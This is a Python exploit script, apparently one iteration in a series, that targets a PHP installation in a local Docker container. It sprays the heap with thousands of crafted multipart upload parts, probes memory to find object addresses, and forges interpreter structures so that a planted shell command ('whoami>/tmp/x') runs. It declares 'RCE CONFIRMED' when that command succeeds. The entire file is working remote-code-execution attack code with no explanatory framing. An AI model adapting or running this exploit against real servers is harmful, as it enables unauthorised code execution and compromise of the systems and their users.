#!/usr/bin/env python3
"""oom107: aim the ARENA, not the part — warm-up replacement + all-part tiles.

oom106 bisect verdict: NO p0 offset crashes (all 8 windows legal, all
silent) and even AAAA filler doesn't crash -> tonight's walked slot
reads NEITHER p0's tile NOR fresh AAAA material -> it reads the
WARM-UP arena (WARMUPX -> type nibble 2 -> quiet free -> silent 200).
oom98f/g crashed because their plant/fires were the most recent big
allocations at walk time.

FIX (region-agnostic law, restored properly):
  phase 1: warm with WARMUPX tiles (probe-able) -> measure V -> OBJ
  phase 2: flood arena with AIM-tile posts — tile in EVERY part of
           every post (any arena slot in any part is then legal)
  phase 3: fires (same aim body) — walk reads recent arena = aim tile
OBJ: three-bit law (nib8, bit8=1, bit9=0), block >= 500, grid covers
every 8-byte slot (grid = (8-V)%8, step 8).
"""
import struct, subprocess, time, re, urllib.request, urllib.error

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MAXT = 1537
BOFF = 670           # block well past observed walk slots; cleared per boot

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)

def build_tile(OBJ, BOFF, V):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)
    struct.pack_into("<II", B, 0x08, 1, 0)
    struct.pack_into("<Q",  B, 0x10, 0)
    struct.pack_into("<I",  B, 0x2C, 1)           # num_args (frame+44)
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)  # handlers -> table
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)  # arg zval = gs
    B[0x58:0x5C] = struct.pack("<I", 6)           # IS_STRING
    B[0x68:0x68 + 40] = gs_block()
    B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    T = bytearray(MAXT)
    grid = (8 - (V % 8)) % 8
    for off in range(grid, BOFF - 8, 8):          # EVERY 8-byte slot
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    # tail after block: pad with OBJ pointers too (any slot, any parity)
    for off in range(BOFF + TILE, MAXT - 8, 8):
        struct.pack_into("<Q", T, off, OBJ)
    return bytes(T)

def probe_copies(needle, maxc=12):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=%d" % (HOST + "/oom_probe.php", h, maxc), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            return [int(x, 16) for x in m.group(2).split()]
    return []

def find_obj(offs):
    for V in offs:
        for b in range(BOFF - 260, MAXT - TILE):
            x = V + b
            if (x & 0xF) == 8 and ((x >> 8) & 1) == 1 and ((x >> 9) & 1) == 0:
                return V, x, b
    return None, None, None

def body_all_parts(tile):
    """EVERY part carries the tile (region-agnostic law)."""
    parts = []
    for i in range(3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, tile))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

# ---- phase 1: WARMUPX warm + measure ----
WARM = body_all_parts((b"WARMUPX" * 192 + b"W" * 400)[:1537])
for i in range(25):
    post(WARM)
offs = probe_copies(b"WARMUPX" * 24, maxc=12)
OUT("    copies=%s" % ([hex(o) for o in offs[:6]],))
assert offs, "no copies"
V, OBJ, boff = find_obj(offs)
OUT("    V=%s OBJ=%s BOFF=%d" % (hex(V) if V else None,
    hex(OBJ) if OBJ else None, boff))
assert OBJ, "no legal OBJ"

# ---- phase 2: AIM flood (arena now = aim tiles) ----
tile = build_tile(OBJ, boff, V)
AIM = body_all_parts(tile)
code, resp = post(AIM)
OUT("    aim flood: %s" % code)
if check_x("flood"):
    raise SystemExit("*** RCE CONFIRMED (flood) ***")

# ---- phase 3: fires ----
for fi in range(4):
    code, resp = post(AIM)
    OUT("    fire%d: %s" % (fi, code))
    if check_x("fire%d" % fi):
        raise SystemExit("*** RCE CONFIRMED ***")
    if code == "ERR":
        time.sleep(4)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
